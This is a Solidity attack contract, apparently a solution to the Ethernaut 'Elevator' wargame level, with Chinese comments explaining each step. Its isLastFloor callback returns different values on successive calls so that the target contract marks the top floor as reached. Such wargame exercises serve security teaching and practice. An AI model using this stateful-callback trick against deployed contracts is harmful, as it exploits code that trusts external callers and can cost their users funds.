// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator public target;
    bool public isCalled = false; // 用來切換回傳值的狀態

    constructor(address _target) {
        target = IElevator(_target);
    }

    // 關鍵：實作 Building 接口要求的函數
    function isLastFloor(uint256) external returns (bool) {
        if (!isCalled) {
            // 第一次呼叫：回傳 false，讓 Elevator 進入 if 區塊
            isCalled = true;
            return false;
        } else {
            // 第二次呼叫：回傳 true，讓 Elevator 把 top 設為 true
            return true;
        }
    }

    function attack() external {
        // 隨便去哪一層都行，假設 100 層
        target.goTo(100);
    }
}
